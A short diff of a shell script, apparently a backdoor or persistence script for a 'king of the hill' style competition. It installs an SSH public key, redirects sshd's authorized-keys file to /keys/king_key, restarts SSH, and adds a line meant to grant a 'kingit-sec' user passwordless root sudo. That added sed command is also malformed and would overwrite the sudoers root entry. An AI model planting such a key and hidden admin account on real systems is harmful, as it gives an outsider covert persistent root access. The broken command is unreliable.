@@ -7,3 +7,4 @@ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClteF32zJRsCXoEiA62Ka+bAS3soPlnAeev5
 sed -i "s/^#AuthorizedKeysFile/AuthorizedKeysFile/" /etc/ssh/sshd_config
 sed -i "s|.ssh/authorized_keys2|/keys/king_key|" /etc/ssh/sshd_config
 /etc/init.d/ssh restart
+sed -i "s/^root/a kingit-sec  ALL=(ALL:ALL) NOPASSWD:ALL/" /etc/sudoers
